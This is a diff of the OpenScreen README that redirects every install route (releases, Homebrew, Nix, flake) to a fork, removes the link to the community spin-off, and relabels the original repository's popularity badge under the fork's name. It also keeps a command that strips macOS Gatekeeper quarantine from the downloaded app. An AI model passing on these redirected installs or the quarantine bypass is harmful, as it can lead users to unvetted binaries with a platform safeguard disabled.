@@ -1,16 +1,12 @@
 > [!Note]
-> OpenScreen is now archived and no longer maintained. For continued maintenance and development, a community-driven spin-off led by one of the core contributors is available here: https://github.com/EtienneLescot/openscreen
-
-
-> [!WARNING]
-> This started as a side project that blew up; not production grade and you'll hit bugs, but hopefully it covers what you need. **This project will soon be archived.**
+> OpenScreen is now archived and no longer maintained. This is **openscreen-101**, an enhanced fork with continued development and new features.
 
 
 <p align="center">
   <img src="public/openscreen.png" alt="OpenScreen Logo" width="64" />
   <br />
   <br />
-	<a href="https://trendshift.io/repositories/17427" target="_blank"><img src="https://trendshift.io/api/badge/repositories/17427" alt="siddharthvaddem%2Fopenscreen | Trendshift" style="width: 256px; height: 64px;" width="256" height="64"/></a>
+	<a href="https://trendshift.io/repositories/17427" target="_blank"><img src="https://trendshift.io/api/badge/repositories/17427" alt="jkxln101-lang%2Fopenscreen-101 | Trendshift" style="width: 256px; height: 64px;" width="256" height="64"/></a>
 
 
   </a>
@@ -53,14 +49,14 @@ Screen Studio is an awesome product and this is definitely not a 1:1 clone. If y
 
 ## Installation
 
-Download the latest installer for your platform from the [GitHub Releases](https://github.com/siddharthvaddem/openscreen/releases) page.
+Download the latest installer for your platform from the [GitHub Releases](https://github.com/jkxln101-lang/openscreen-101/releases) page.
 
 ### macOS
 
 The easiest way to install on macOS is via [Homebrew](https://brew.sh):
 
 ```bash
-brew install --cask siddharthvaddem/openscreen/openscreen
+brew install --cask jkxln101-lang/openscreen-101/openscreen
 ```
 
 Brew automatically picks the right build for Apple Silicon or Intel, and verifies the download against a notarized signature so Gatekeeper won't block it.
@@ -70,7 +66,7 @@ To uninstall: `brew uninstall --cask openscreen` (add `--zap` to also remove app
 
 #### Manual install (if you prefer)
 
-If you'd rather grab the `.dmg` directly from the [Releases page](https://github.com/siddharthvaddem/openscreen/releases) and encounter Gatekeeper blocking the app, you can bypass it by running the following command in your terminal after installation:
+If you'd rather grab the `.dmg` directly from the [Releases page](https://github.com/jkxln101-lang/openscreen-101/releases) and encounter Gatekeeper blocking the app, you can bypass it by running the following command in your terminal after installation:
 
 ```bash
 xattr -rd com.apple.quarantine /Applications/Openscreen.app
@@ -85,20 +81,11 @@ After running this command, proceed to **System Preferences > Security & Privacy
 
 ### Windows
 
-Install via [winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/):
-
-```bash
-winget install SiddharthVaddem.OpenScreen
-```
-
-To update later: `winget upgrade SiddharthVaddem.OpenScreen`
-To uninstall: `winget uninstall SiddharthVaddem.OpenScreen`
-
-If you'd rather grab the `.exe` installer directly, download it from the [Releases page](https://github.com/siddharthvaddem/openscreen/releases).
+Download the `.exe` installer from the [Releases page](https://github.com/jkxln101-lang/openscreen-101/releases).
 
 ### Linux
 
-Three packages are published to the [Releases page](https://github.com/siddharthvaddem/openscreen/releases) for each version. Pick the one that matches your distro:
+Three packages are published to the [Releases page](https://github.com/jkxln101-lang/openscreen-101/releases) for each version. Pick the one that matches your distro:
 
 **Debian / Ubuntu / Pop!_OS (`.deb`)**
 ```bash
@@ -120,18 +107,18 @@ chmod +x Openscreen-Linux-*.AppImage
 
 Try without installing:
 ```bash
-nix run github:siddharthvaddem/openscreen
+nix run github:jkxln101-lang/openscreen-101
 ```
 
 Install into your user profile:
 ```bash
-nix profile install github:siddharthvaddem/openscreen
+nix profile install github:jkxln101-lang/openscreen-101
 ```
 
 For a NixOS system config (flake):
 ```nix
 {
-  inputs.openscreen.url = "github:siddharthvaddem/openscreen";
+  inputs.openscreen.url = "github:jkxln101-lang/openscreen-101";
 
   outputs = { nixpkgs, openscreen, ... }: {
     nixosConfigurations.<host> = nixpkgs.lib.nixosSystem {
